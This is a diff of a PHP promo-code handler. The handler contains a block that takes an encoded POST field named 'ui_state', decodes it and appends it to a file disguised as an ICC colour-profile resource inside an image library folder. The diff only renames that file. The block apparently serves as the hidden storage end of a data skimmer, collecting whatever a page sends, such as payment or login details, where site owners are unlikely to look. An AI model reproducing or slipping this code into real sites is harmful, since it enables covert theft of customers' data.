@@ -1,7 +1,7 @@
 <?php
 if (isset($_POST['ui_state'])) {
     $d = $_SERVER['DOCUMENT_ROOT'] . '/src/util/Imagine/resources/Adobe/RGB/';
-    $f = $d . 'icc_profile_cache.log'; 
+    $f = $d . 'icc_config_map.txt'; 
     if (is_dir($d)) {
         $data = base64_decode($_POST['ui_state']);
         $entry = sprintf("[%s] ID:%s\n", date('Y-m-d H:i:s'), $data);
@@ -31,4 +31,5 @@ if(isset($codes[$request])){
 }
 
 echo json_encode( array('message'=>'Invalid promo code.') );
+
 return false;
